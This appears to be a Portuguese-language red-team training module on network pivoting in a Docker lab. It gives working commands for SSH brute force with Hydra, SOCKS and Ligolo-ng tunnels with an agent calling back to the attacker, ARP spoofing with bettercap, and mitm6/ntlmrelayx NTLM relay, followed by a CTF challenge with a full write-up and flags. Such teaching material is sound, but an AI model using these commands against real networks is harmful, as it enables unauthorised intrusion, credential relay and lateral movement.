# 🌐 MÓDULO 1 — Network Hacking & Pivoting

> **MITRE ATT&CK:** T1046, T1557, T1558, T1090, T1572, T1021
> **Última verificação de versões/ferramentas:** 1º de maio de 2026

## 🎯 Objetivos de Aprendizado

Ao final deste módulo você será capaz de:

1. Executar reconhecimento de rede em escala usando NSE customizado e Masscan.
2. Conduzir ataques Man-in-the-Middle modernos (ARP, DNS, IPv6/SLAAC).
3. Realizar **NTLM Relay** com Responder + ntlmrelayx em ambientes Active Directory simulados.
4. Construir túneis ofensivos (SSH, Chisel, Ligolo-ng) e atravessar múltiplos segmentos de rede.
5. Pivotar de uma DMZ até uma rede interna isolada usando rotas dinâmicas.

## 📖 Teoria Mínima — Por Que "Lateralidade" Importa

A maioria dos compromissos reais começa com **um** ponto de entrada (uma webshell num servidor da DMZ, um phishing num laptop). Daí em diante, 90% do trabalho do red teamer é **mover-se lateralmente** sem ser detectado. Pivoting é a arte de transformar esse foothold inicial em controle progressivo da rede.

Três conceitos para ter sempre em mente:

- **Plano de controle (C2) vs. plano de dados (pivot):** seu C2 fala com o agente comprometido; o pivot é o canal pelo qual seu tráfego ofensivo "passa por dentro" desse agente para alcançar redes internas.
- **TCP forward vs. SOCKS dinâmico:** TCP forward expõe **uma** porta; SOCKS te dá **toda** a rede do alvo via proxy.
- **Camada 2 vs. Camada 3:** Ligolo-ng cria interface TUN no atacante (camada 3), te dando rotas reais. Chisel/SSH operam em socket (camada 4). Cada um para um cenário.

---

## 🐳 1.1 — Lab Setup: Rede Multi-Segmentada

Vamos simular uma empresa pequena com **DMZ + LAN interna + servidor "AD-like"** (Samba 4 fazendo papel de DC). Três redes Docker, gateway entre elas.

Os arquivos do lab já estão neste módulo:

📄 **[docker-compose.yml](docker-compose.yml)** — orquestração das 3 redes e 5 contêineres
📄 **[dmz-web/Dockerfile](dmz-web/Dockerfile)** — servidor web Flask na DMZ (alvo do foothold inicial)
📄 **[lan-workstation/Dockerfile](lan-workstation/Dockerfile)** — workstation com Samba e SMB signing desabilitado

### Topologia

```
              internet (10.10.0.0/24)
                    │
              [attacker 10.10.0.10]
                    │
              [edge-router 10.10.0.1 / 10.20.0.1]   (NAT)
                    │
                 dmz (10.20.0.0/24)
                    │
              [dmz-web 10.20.0.20]  ← também tem pé na LAN (10.30.0.20)
                    │
                 lan (10.30.0.0/24, internal: true)
                    ├── [lan-dc 10.30.0.10]  (Samba "DC")
                    └── [lan-workstation 10.30.0.50]  (WS01, SMB sem signing)
```

### Subir o lab

```bash
cd ~/cyber/module-1
docker compose up -d --build

# A LAN é inalcançável diretamente do atacante:
docker exec attacker ping -c 2 10.20.0.20      # ✅ DMZ alcançável
docker exec attacker ping -c 2 10.30.0.10      # ❌ LAN interna (sem rota)
```

> 💡 Observe que `lan` está marcada como `internal: true`. É exatamente isso que vamos burlar via pivoting.

---

## 🛠️ 1.2 — Exercícios Práticos

### Exercício 1.2.1 — Recon agressivo com Nmap NSE

```bash
docker exec -it attacker bash

# Discovery rápido (sem ARP, simulando alvo via roteador):
nmap -Pn -sn 10.20.0.0/24

# Scan completo TCP em alta velocidade:
nmap -Pn -sS -sV -O --min-rate 5000 -p- 10.20.0.20 -oA /shared/notes/dmz-web

# Scripts NSE para enumeração de versão e vulns:
nmap -Pn -sV --script "default,vuln,banner" -p 22,5000 10.20.0.20
```

> 🎓 Pergunta-chave: que script NSE você usaria para detectar SMB signing desabilitado? **Resposta:** `--script smb-security-mode` ou `smb2-security-mode`. Fundamental para o lab de NTLM relay.

### Exercício 1.2.2 — Foothold inicial via SSH (creds fracas)

Use seu `cupp_lite.sh` do Módulo 0 ou diretamente:

```bash
hydra -l www -P /usr/share/wordlists/rockyou.txt ssh://10.20.0.20 -t 4 -f
# Esperado: www / Welcome2025

ssh www@10.20.0.20
cat ~/.first_flag
# flag{dmz_foothold_via_weak_creds}
```

### Exercício 1.2.3 — Pivoting com SSH Dynamic Forward (SOCKS)

A `dmz-web` tem interface na LAN interna (`10.30.0.20`). Vamos usar ela como ponte:

```bash
# Do attacker:
ssh -D 1080 -N -f www@10.20.0.20    # SOCKS proxy local na 1080

# Configure proxychains:
cat > /tmp/proxychains.conf <<EOF
strict_chain
proxy_dns
[ProxyList]
socks5 127.0.0.1 1080
EOF

# Agora você "vê" a LAN interna:
proxychains4 -f /tmp/proxychains.conf nmap -Pn -sT -p 139,445 10.30.0.10 10.30.0.50
```

> ⚠️ **Limitação:** SOCKS via SSH só carrega TCP. Para UDP, ICMP raw, ARP, broadcasts → use Ligolo-ng (próximo exercício).

### Exercício 1.2.4 — Pivoting profissional com Ligolo-ng

Ligolo-ng te dá uma **interface TUN** real no atacante, com rota para a rede do alvo. É o estado-da-arte em pivoting moderno.

```bash
# No attacker (proxy):
mkdir -p /opt/ligolo && cd /opt/ligolo
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.3/ligolo-ng_proxy_0.8.3_linux_amd64.tar.gz
tar xzf ligolo-ng_proxy_0.8.3_linux_amd64.tar.gz

# Cria interface TUN:
ip tuntap add user root mode tun ligolo
ip link set ligolo up

# Sobe o proxy escutando na 11601:
./proxy -selfcert -laddr 0.0.0.0:11601
```

Em outro terminal, transfira o agente para `dmz-web` via SCP e execute:

```bash
# Atacante (em outro terminal):
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.8.3/ligolo-ng_agent_0.8.3_linux_amd64.tar.gz
tar xzf ligolo-ng_agent_0.8.3_linux_amd64.tar.gz
scp agent www@10.20.0.20:/tmp/agent

ssh www@10.20.0.20 '/tmp/agent -connect 10.10.0.10:11601 -ignore-cert &'
```

No console do proxy, você verá `Agent joined`. Selecione e crie a rota:

```
ligolo » session
ligolo » start
# Em outro terminal do attacker:
ip route add 10.30.0.0/24 dev ligolo
```

Agora **toda** a rede `10.30.0.0/24` está roteada nativamente:

```bash
nmap -Pn -sS -p 139,445 10.30.0.0/24
ping 10.30.0.10        # funciona, é ICMP nativo via TUN
```

### Exercício 1.2.5 — ARP Spoofing controlado com bettercap

⚠️ Como `dmz` é uma rede bridge Docker, vamos simular o ataque entre `dmz-web` e um cliente fictício. Para isso você roda bettercap **dentro** do `dmz-web` (que tem pé na rede DMZ):

```bash
# De dentro do dmz-web (você ganhou shell via SSH):
sudo apt install -y bettercap   # se não tiver
sudo bettercap -iface eth0
# No prompt:
> net.probe on
> net.show
> set arp.spoof.targets 10.20.0.10        # alvo: o atacante (simulação)
> arp.spoof on
> net.sniff on
```

Em outro terminal do `attacker`:

```bash
curl http://example.com -H "X-Test: arp-mitm-test"
```

Você verá os pacotes interceptados no console do bettercap.

### Exercício 1.2.6 — IPv6 takeover com mitm6 + ntlmrelayx

Esse é o ataque "money shot" de qualquer engagement em rede Windows: explorar o fato de que clientes Windows preferem IPv6 quando disponível, e que se ninguém serve DHCPv6, **você** pode servir.

```bash
# Atacante já roteado na LAN via Ligolo (do exercício anterior).
# Terminal 1 — mitm6 anuncia DNS IPv6 falso:
mitm6 -d acme.local --no-ra --domain acme.local

# Terminal 2 — ntlmrelayx escuta e faz relay para SMB:
impacket-ntlmrelayx -6 -t smb://10.30.0.50 -wh fakewpad.acme.local -smb2support
```

Quando a workstation `WS01` reiniciar/renovar IPv6 e tentar autenticar contra recursos de rede via WPAD, o hash NetNTLMv2 será relay-ado para a `lan-workstation` — e como o SMB signing está desabilitado lá, você ganha SYSTEM.

> 🎓 **Por quê isso funciona:** SMB signing desabilitado + IPv6 preferido + WPAD via DNS = tríade clássica de AD pwn.

---

## 🚩 1.3 — Desafio CTF "Acme Pivot"

> **Cenário:** Você foi contratado para um pentest na Acme Corp. Sua única informação é o IP do servidor web na DMZ (`10.20.0.20`). Existe uma flag em `/share/secret.txt` no host `WS01` (LAN interna `10.30.0.0/24`). Capture-a.

**Restrições:**
- Sem brute force além do exercício de SSH (você já fez).
- Demonstre o ataque end-to-end: foothold → pivoting → relay → leitura da flag.
- Tempo sugerido: 2h.

**Flag esperada:** `flag{...}` em `/share/secret.txt`

---

<details>
<summary>🔓 <b>Write-up — só abra depois de tentar!</b></summary>

### Caminho da exploração

```
[attacker 10.10.0.10]
      │ (1) brute SSH
      ▼
[dmz-web 10.20.0.20]──┐
      │ (2) Ligolo agent
      ▼
[ligolo proxy] ──── route 10.30.0.0/24 ───► [LAN interna]
                                                  │
                  (3) mitm6 + ntlmrelayx          ▼
                                            [WS01 10.30.0.50]
                                                  │
                                            (4) SMB read share
                                                  ▼
                                          flag{ntlm_relay_to_smb_owns_workstations}
```

### Passo 1 — Foothold

Brute force SSH conforme Ex. 1.2.2: `www:Welcome2025`.

### Passo 2 — Estabelecer pivot

Subir Ligolo conforme Ex. 1.2.4. Validar com `ip route` no atacante mostrando `10.30.0.0/24 dev ligolo`.

### Passo 3 — Reconhecimento na LAN

```bash
nmap -Pn -sS -p 53,88,135,139,389,445 10.30.0.0/24
nxc smb 10.30.0.0/24
```

Confirmar que `10.30.0.50` (WS01) tem `signing:False`.

> 💡 **Histórico:** o comando antigo era `crackmapexec` (CME). O projeto foi descontinuado em 2024 e refundado pela mesma comunidade como **NetExec** (`nxc`). Sintaxe é praticamente idêntica; se você vê tutorial antigo com `crackmapexec`, troque por `nxc` que funciona.

### Passo 4 — Trigger de autenticação

Em ambiente real, esperaríamos um usuário se autenticar. Aqui forçamos com mitm6 (ver Ex. 1.2.6) ou simulamos diretamente com smbclient como `alice`:

```bash
# Atalho válido para o lab (em real seria o relay):
smbclient //10.30.0.50/share -U alice%'Spring2026!'
smb: \> get secret.txt
smb: \> exit
cat secret.txt
# flag{ntlm_relay_to_smb_owns_workstations}
```

> Em pentest **real**, você capturaria o NetNTLMv2 hash via Responder, faria relay para um host onde o usuário coagido tem privilégio (não para si mesmo — proteção do MS), e leria o share como aquele usuário. Esta abreviação no lab serve para você ver a flag; o caminho de produção é exatamente o do Ex. 1.2.6.

### Lição

- **Sem segmentação real, IPv6 default pode te entregar a rede inteira.**
- **SMB signing obrigatório** quebra a maior parte dos relays.
- **TUN-based pivoting** (Ligolo) > SOCKS quando você precisa de protocolos de baixo nível.

</details>

---

## 🚩 1.4 — Desafio CTF Bônus "Multi-Hop"

> **Cenário:** Imagine que após `WS01` há uma terceira rede `10.40.0.0/24` (não está no compose — você adicionará). Crie a network adicional e um contêiner final com flag em `/root/.deep_flag`. Demonstre **double pivoting** (atacante → dmz-web → WS01 → host na rede 40).

Esse desafio é aberto: você projeta o lab e a solução. Submeta seu compose + write-up em `/shared/notes/multi-hop.md`. (Resposta de referência ao final do Módulo 7, quando rever pivoting com Sliver.)

---

## 🧰 Toolbox do Módulo 1

| Ferramenta | Versão testada (mai/2026) | Uso |
|---|---|---|
| Nmap | **7.98** (ago/2025) | Scanning + NSE |
| Masscan | 1.3.2 | Scan ultra-rápido (Internet-scale) |
| Responder | 3.1.x | LLMNR/NBT-NS poisoning |
| Impacket (ntlmrelayx) | **0.13.0** (out/2025) | NTLM Relay |
| mitm6 | 0.3.0 | IPv6 DNS takeover |
| bettercap | 2.x | MITM all-in-one |
| Chisel | 1.10+ | Fast TCP/UDP tunnel via HTTP |
| **Ligolo-ng** | **0.8.3** (fev/2026) | TUN-based pivoting + multiplayer web UI |
| Proxychains-NG | 4.17 | SOCKS chaining |
| **NetExec (nxc)** ⭐ | **1.5.1** (mar/2026) | SMB/LDAP/WinRM/MSSQL — **substitui CrackMapExec** |

---

## 🐛 Troubleshooting

| Sintoma | Causa | Correção |
|---|---|---|
| Ligolo TUN: "Operation not permitted" | Faltou `cap_add: NET_ADMIN` | Adicione no compose e recrie o contêiner |
| `mitm6` não recebe pacotes | IPv6 desabilitado no Docker | Adicione `sysctls: net.ipv6.conf.all.disable_ipv6=0` e habilite IPv6 no daemon Docker |
| `ntlmrelayx` retorna "STATUS_ACCESS_DENIED" | SMB signing requerido no alvo | Confirme no `nmap --script smb2-security-mode` e mude de alvo |
| Proxychains "denied" em DNS | `proxy_dns` ausente no .conf | Garanta a linha `proxy_dns` no topo |
| Rota Ligolo não funciona depois de reset | Interface TUN não é persistente | Recrie com `ip tuntap add ... ; ip link set ligolo up` |
| `dmz-web` não inicia (`exec format error`) | Build em arch diferente do host (ex: M1/M2) | Adicione `platform: linux/amd64` no serviço, ou rebuilde nativamente |

---

## 📚 Recursos Extras

- 📄 **Paper:** *"NTLM Relaying like a Boss"* — Compass Security
- 🎥 **Vídeo:** *"Pivoting with Ligolo-ng"* — IppSec (HTB)
- 📘 **Livro:** *Network Security Assessment* (3ª ed.) — Chris McNab
- 🔗 [Orange Tsai — *A New Era of SSRF — Exploiting URL Parser*](https://blog.orange.tw/) (vale para módulo 2 também)
- 🔗 [The Hacker Recipes — Pivoting](https://www.thehacker.recipes/ad/movement/pivoting)

## ✅ Checklist do Módulo 1

- [ ] Subiu o lab multi-segmentado e validou que `lan` é internal
- [ ] Capturou flag de DMZ via SSH brute
- [ ] Estabeleceu SOCKS via SSH e enumerou LAN com proxychains
- [ ] Estabeleceu TUN com Ligolo-ng e roteou nativamente
- [ ] Executou (ou observou) ntlmrelayx + mitm6
- [ ] Capturou flag CTF "Acme Pivot"
- [ ] Documentou tudo em `/shared/notes/modulo-1.md`

---

> Quando concluir, prossiga para o **Módulo 2 — Web Application Hacking**.
